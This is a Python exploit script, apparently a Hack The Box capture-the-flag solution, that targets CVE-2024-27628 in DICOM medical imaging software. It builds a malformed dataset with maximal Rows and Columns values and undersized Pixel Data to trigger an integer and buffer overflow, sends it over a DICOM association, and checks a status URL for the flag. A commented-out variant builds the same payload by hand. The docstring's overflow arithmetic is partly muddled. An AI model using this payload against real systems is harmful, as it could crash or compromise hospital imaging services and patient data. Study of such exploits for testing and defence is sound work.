#import struct
from scapy_DICOM import *
import requests

"""
Triggers integer overflow + buffer overflow
Exploit sent via DICOM P-DATA-TF
Flag retrieved via DICOM C-FIND
solution using Struct or Scapy data

Expected pixels: 65535 * 65535 = 4294836225 (overflows 32-bit int)
Actual allocated buffer size: (rows*cols) * 2 (bytes/pixel) 
 = 8,589,672,450 bytes (but malloc may truncate)
"""

def create_cve_2024_27628_dataset():
    """Triggers overflow using Scapy DICOM fields"""
    ds = DICOMDataset()
    
    # Add malicious Rows with overflow value
    ds += DICOMField(
        group=0x0028, element=0x0010,
        VR="US", value=b"\xff\xff"  # Uint16: 65535
    )
    
    # Add malicious Columns with overflow value
    ds += DICOMField(
        group=0x0028, element=0x0011,
        VR="US", value=b"\xff\xff"  # Uint16: 65535
    )
    
    # Add undersized Pixel Data
    ds += DICOMField(
        group=0x7FE0, element=0x0010,
        VR="OB", value=b"A"*1000
    )
    
    return bytes(ds)

""" def create_cve_2024_27628_dataset():
    # Values to overflow rows*cols (Uint16 multiplication)
    rows = 65535  # Max Uint16
    cols = 65535  # Max Uint16
    
    # Craft malicious dataset
    dataset = b""
    
    # (0028,0010) Rows
    dataset += struct.pack('<HHHHI', 0x0028, 0x0010, 0x5553, 0, 2)  # US
    dataset += struct.pack('<H', rows)
    
    # (0028,0011) Columns
    dataset += struct.pack('<HHHHI', 0x0028, 0x0011, 0x5553, 0, 2)  # US
    dataset += struct.pack('<H', cols)
    
    # (7FE0,0010) Pixel Data (undersized)
    pixel_data = b"A" * 1000  # Much smaller than expected 8.5GB
    dataset += struct.pack('<HHHHI', 0x7FE0, 0x0010, 0x4F57, 0, len(pixel_data))
    dataset += pixel_data
    
    return dataset """

# run exploit to associate and send CVE
# TODO: add arg parse
if __name__ == '__main__':
    try:
        # Associate with remote AE
        session = DICOMSession("TEST_CLIENT", "TEST_AE", "localhost")
        if session.associate():
            print("Association established")
            # Send malicious dataset
            malicious_data = create_cve_2024_27628_dataset()
            session.send_data(malicious_data)

            # Check for flag via secondary channel
            r = requests.get("http://target:8080/status")
            assert "HTB{" in r.text
            # Graceful release
            if session.release():
                print("Association released")
            else:
                session.abort()
        else:
            print("Association failed")
    except Exception as e:
        print(f"Error: {e}")
        session.abort()